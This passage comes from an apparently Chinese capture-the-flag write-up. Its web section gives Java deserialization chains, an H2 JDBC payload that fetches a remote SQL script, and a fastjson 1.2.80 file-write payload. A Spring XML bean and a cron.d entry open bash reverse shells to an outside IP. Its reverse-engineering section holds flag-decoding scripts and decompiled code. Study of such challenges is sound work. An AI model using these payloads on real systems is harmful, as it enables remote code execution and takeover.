class="line">        String url=<span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=&quot;</span>;</span><br><span class="line">        MyDataSource myDataSource = new MyDataSource(url+evil, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        advisedSupport.setTarget(myDataSource);</span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Xml 加载</li>
</ul>
<p>ClassPathXmlApplicationContext</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- ClassPathXmlApplicationContext解析 XML 时，会创建ProcessBuilder实例并执行start()，最终触发反弹 shell--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/162.210.192.205/60860 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>H2 不支持VARCHAR（字符串类型）直接转为JAVA_OBJECT（ConstructorUtils.invokeConstructor的参数类型要求），因此需要 “间接转换”：</p>
<p>执行SET @uri&#x3D;URI_CREATE(‘http:&#x2F;&#x2F;攻击机&#x2F;exp.xml’)：调用URI.create生成URI对象（类型为JAVA_OBJECT）。</p>
<p>执行SET @xml_url_obj&#x3D;INVOKE_METHOD(@uri, ‘toString’, NULL)：调用URI.toString()，返回的字符串会被 H2 识别为JAVA_OBJECT类型（因INVOKE_METHOD的返回值是Object），满足后续构造函数的参数类型要求。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="keyword">FOR</span> <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="keyword">FOR</span> <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="keyword">FOR</span> <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_str</span><span class="operator">=</span><span class="string">&#x27;http://0n1zplpm.requestrepo.com/evil.xml&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_obj</span><span class="operator">=</span>UNESCAPE_VALUE(<span class="variable">@url_str</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@context_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@string_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"><span class="keyword">CALL</span> NEW_INSTANCE(<span class="variable">@context_clazz</span>, <span class="keyword">ARRAY</span>[<span class="variable">@string_clazz</span>], <span class="keyword">ARRAY</span>[<span class="variable">@aurl_obj</span>]);</span><br><span class="line">package exploit;</span><br><span class="line"></span><br><span class="line">import challenge.MyDataSource;</span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.CompoundEdit;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">import <span class="keyword">static</span> org.springframework.util.ReflectionUtils.setField;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public <span class="keyword">static</span> void patchWriteReplace(Class clazz) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class ObjectStreamClass <span class="operator">=</span> Class.forName(&quot;java.io.ObjectStreamClass&quot;);</span><br><span class="line">            <span class="keyword">Method</span> lookup <span class="operator">=</span> ObjectStreamClass.getDeclaredMethod(&quot;lookup&quot;, Class.class, boolean.class);</span><br><span class="line">            lookup.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ObjectStreamClass <span class="keyword">desc</span> <span class="operator">=</span> (ObjectStreamClass)lookup.invoke(<span class="keyword">null</span>, clazz, <span class="literal">true</span>);</span><br><span class="line">            setField(<span class="keyword">null</span>, <span class="keyword">desc</span>, &quot;writeReplaceMethod&quot;);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> void main(String[] args) throws Exception &#123;</span><br><span class="line">        UnsafeUtil.patchModule(Main.class);</span><br><span class="line">        UnsafeUtil.patchModule(ReflectUtil.class);</span><br><span class="line"></span><br><span class="line">        MyDataSource dataSource <span class="operator">=</span> <span class="keyword">new</span> MyDataSource(&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://0n1zplpm.requestrepo.com/1.sql&#x27;&quot;, &quot;aaa&quot;, &quot;bbb&quot;);</span><br><span class="line">        CtClass ctClass <span class="operator">=</span> ClassPool.getDefault().<span class="keyword">get</span>(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="line">        CtMethod writeReplace <span class="operator">=</span> ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        POJONode pojoNode <span class="operator">=</span> <span class="keyword">new</span> POJONode(dataSource);</span><br><span class="line">        EventListenerList eventListenerList <span class="operator">=</span> <span class="keyword">new</span> EventListenerList();</span><br><span class="line">        UndoManager undoManager <span class="operator">=</span> <span class="keyword">new</span> UndoManager();</span><br><span class="line">        Vector vector <span class="operator">=</span> (Vector) ReflectUtil.getFieldValue(CompoundEdit.class, undoManager, &quot;edits&quot;);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        ReflectUtil.setFieldValue(eventListenerList, &quot;listenerList&quot;, <span class="keyword">new</span> Object[]&#123;InternalError.class, undoManager&#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(eventListenerList)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FastJ"><a href="#FastJ" class="headerlink" title="FastJ"></a>FastJ</h3><p>看名字就是fastjson</p>
<p>整体项目是 jdk 11  fastjson 1.2.80</p>
<p>查一下cve</p>
<p>[fastjson 1.2.68漏洞分析](<a target="_blank" rel="noopener" href="https://blog.ninefiger.top/2022/11/11/fastjson">https://blog.ninefiger.top/2022/11/11/fastjson</a> 1.2.68漏洞分析&#x2F;)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring">GitHub - luelueking&#x2F;CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p>
<p>本题没有exp 中的 commons-io </p>
<p>应该是用 fastjson autotype 缓存+ 给出的 FilterFileOutputStream 实现 rce</p>
<p>Fj 1.2.80 删除auotcloseable 但是 throwable 可以将指定类添加到map 里面</p>
<p>UTF8JsonGenerator -&gt; JsonGenerator -&gt; JsonGenerationException -&gt; Exception</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;a&quot;: &quot;&#123; \&quot;<span class="variable">@type</span>\&quot;: \&quot;java.lang.Exception\&quot;, \&quot;<span class="variable">@type</span>\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerationException\&quot;, \&quot;g\&quot;: &#123;&#125; &#125;&quot;,</span><br><span class="line">  &quot;b&quot;: &#123; &quot;$ref&quot;: &quot;$.a.a&quot; &#125;,</span><br><span class="line">  &quot;c&quot;: &quot;&#123; \&quot;<span class="variable">@type</span>\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerator\&quot;, \&quot;<span class="variable">@type</span>\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8JsonGenerator\&quot;, \&quot;<span class="keyword">out</span>\&quot;: &#123;&#125; &#125;&quot;,</span><br><span class="line">  &quot;d&quot;: &#123; &quot;$ref&quot;: &quot;$.c.c&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复用exp中的逻辑 ：</p>
<p>sun.rmi.server.MarshalOutputStream 在序列化时会自动调用内部 out 字段的 write () 方法触发数据写入；java.util.zip.InflaterOutputStream 解压提前压缩的数据；</p>
<p>com.app.FilterFileOutputStream 接收 name（文件路径）和 prefix（路径前缀校验）参数，直接创建目标文件</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.OutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.app.FilterFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/etc/cron.d/evil&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJzTUtCCwqL8/BIF/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDf0MxIz8jQQM/QEkgbmOqbGViYGSgY2KkZqgMA8sIStg==&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limit&quot;</span><span class="punctuation">:</span> <span class="number">73</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;100&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>任意写后 尝试 写jsp privatekey crontab等发现有定时任务，成功反弹shell</p>
<p><a target="_blank" rel="noopener" href="https://seven1an.github.io/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/index.html">文件覆盖漏洞-crontab反弹shell细节问题</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;SHELL=/bin/bash\n* * * * * root /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/162.210.192.205/35708 0&gt;&amp;1&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须要注意的是</span></span><br><span class="line"><span class="comment">## 1 环境变量 shell得写</span></span><br><span class="line"><span class="comment">## 2 /bin/bash 需是完整路径</span></span><br><span class="line"><span class="comment">## 3 末尾 \n 必加，否则不会认为结束</span></span><br></pre></td></tr></table></figure>

<p><strong>!!! 10.17 10:12 ak web</strong></p>
<p><strong>完结撒花</strong></p>
<h2 id="REV（17-23）"><a href="#REV（17-23）" class="headerlink" title="REV（17&#x2F;23）"></a>REV（17&#x2F;23）</h2><h3 id="Babyapk"><a href="#Babyapk" class="headerlink" title="Babyapk"></a>Babyapk</h3><p>简单的异或</p>
<p><img src="/1763435254333-10.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Typography.less == &#x27;&lt;&#x27; 和 Typography.amp == &#x27;&amp;&#x27;</span></span><br><span class="line">cArr = [</span><br><span class="line"> <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>), <span class="number">127</span>, <span class="built_in">ord</span>(<span class="string">&#x27;4&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;4&#x27;</span>),</span><br><span class="line"> <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;;&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;&lt;&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;:&#x27;</span>),</span><br><span class="line"> <span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;&amp;&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;?&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&quot;&#x27;&quot;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;,&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>),</span><br><span class="line"> <span class="built_in">ord</span>(<span class="string">&#x27;u&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;:&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;*&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>),</span><br><span class="line"> <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;-&#x27;</span>), <span class="number">22</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="number">29</span>, <span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(cArr[i] ^ i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cArr)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 输出: flag&#123;1d3f2c7a-4fc7-48ac-a705-ad26230079f5&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Pyramid"><a href="#Pyramid" class="headerlink" title="Pyramid"></a>Pyramid</h3><p>chal.pyc -&gt; pyramid.pyd -&gt; a_long_way_to_treasure() -&gt;  pyramid.pyc（异或）   -&gt;  checkinput.pyd(rc4)  -&gt; 白盒aes解flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: chal.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyramid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">text = <span class="string">&#x27;A pyramid fortified with intricate defenses looms before you. \nIts secrets are locked behind layers of puzzles. \nYou stand at its base, challenged to unravel them all.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> text.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  <span class="subst">&#123;line&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line">pyramid.a_long_way_to_treasure()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(<span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">.rdata:0000000180008280 unk_180008280   db 0A9h                 ; DATA XREF: .rdata:0000000180007F80↑o</span><br><span class="line">.rdata:0000000180008281                 db  6Ch ; l</span><br><span class="line">.rdata:0000000180008282                 db  63h ; c</span><br><span class="line">.rdata:0000000180008283                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008284                 db  64h ; d</span><br><span class="line">.rdata:0000000180008285                 db  72h ; r</span><br><span class="line">.rdata:0000000180008286                 db  65h ; e</span><br><span class="line">.rdata:0000000180008287                 db  61h ; a</span><br><span class="line">.rdata:0000000180008288                 db  2Bh ; +</span><br><span class="line">.rdata:0000000180008289                 db  30h ; <span class="number">0</span></span><br><span class="line">.rdata:000000018000828A                 db 0B5h</span><br><span class="line">.rdata:000000018000828B                 db  1Bh</span><br><span class="line">.rdata:000000018000828C                 db 0BDh</span><br><span class="line">.rdata:000000018000828D                 db  0Ch</span><br><span class="line">.rdata:000000018000828E                 db  6Bh ; k</span><br><span class="line">.rdata:000000018000828F                 db  6Fh ; o</span><br><span class="line">.rdata:0000000180008290                 db  81h</span><br><span class="line">.rdata:0000000180008291                 db  61h ; a</span><br><span class="line">.rdata:0000000180008292                 db  6Eh ; n</span><br><span class="line">.rdata:0000000180008293                 db  67h ; g</span><br><span class="line">.rdata:0000000180008294                 db  64h ; d</span><br><span class="line">.rdata:0000000180008295                 db  72h ; r</span><br><span class="line">.rdata:0000000180008296                 db  65h ; e</span><br><span class="line">.rdata:0000000180008297                 db  61h ; a</span><br><span class="line">.rdata:0000000180008298                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008299                 db  69h ; i</span><br><span class="line">.rdata:000000018000829A                 db  74h ; t</span><br><span class="line">.rdata:000000018000829B                 db  73h ; s</span><br><span class="line">.rdata:000000018000829C                 db  6Dh ; m</span><br><span class="line">.rdata:000000018000829D                 db  71h ; q</span><br><span class="line">.rdata:000000018000829E                 db  67h ; g</span><br><span class="line">.rdata:000000018000829F                 db  6Fh ; o</span><br><span class="line">.rdata:00000001800082A0                 db  62h ; b</span><br><span class="line">.rdata:00000001800082A1                 db  61h ; a</span><br><span class="line">.rdata:00000001800082A2                 db  6Eh ; n</span><br><span class="line">.rdata:00000001800082A3                 db  67h ; g</span><br><span class="line">.rdata:00000001800082A4                 db  64h ; d</span><br><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: layer2.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-09-10 10:56:06 UTC (1757501766)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> wintypes</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BUF</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&#x27;Length&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Unused&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Ptr&#x27;</span>, ctypes.c_void_p)]</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;Input your key: &#x27;</span>)</span><br><span class="line">tmp = <span class="number">2166136261</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">    tmp = <span class="number">16777619</span> * (tmp ^ <span class="built_in">ord</span>(ch)) &amp; <span class="number">4294967295</span></span><br><span class="line">key_bytes = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, tmp)</span><br><span class="line">advapi32 = ctypes.WinDLL(<span class="string">&#x27;advapi32&#x27;</span>, use_last_error=<span class="literal">True</span>)</span><br><span class="line">SystemFunction033 = advapi32.SystemFunction033</span><br><span class="line">FNPROTO = ctypes.WINFUNCTYPE(<span class="literal">None</span>, ctypes.POINTER(BUF), ctypes.POINTER(BUF))</span><br><span class="line">fn = FNPROTO(ctypes.cast(SystemFunction033, ctypes.c_void_p).value)</span><br><span class="line">data = <span class="string">b&#x27;\xb7\xc3\xbc\xe5 &lt;skip&gt;&#x27;</span></span><br><span class="line">data_buffer = ctypes.create_string_buffer(data)</span><br><span class="line">key_buffer = ctypes.create_string_buffer(key_bytes)</span><br><span class="line">data_buf = BUF(<span class="built_in">len</span>(data), <span class="number">0</span>, ctypes.addressof(data_buffer))</span><br><span class="line">key_buf = BUF(<span class="number">4</span>, <span class="number">0</span>, ctypes.addressof(key_buffer))</span><br><span class="line">fn(ctypes.byref(data_buf), ctypes.byref(key_buf))</span><br><span class="line">pyd_path = os.path.join(os.getcwd(), <span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> 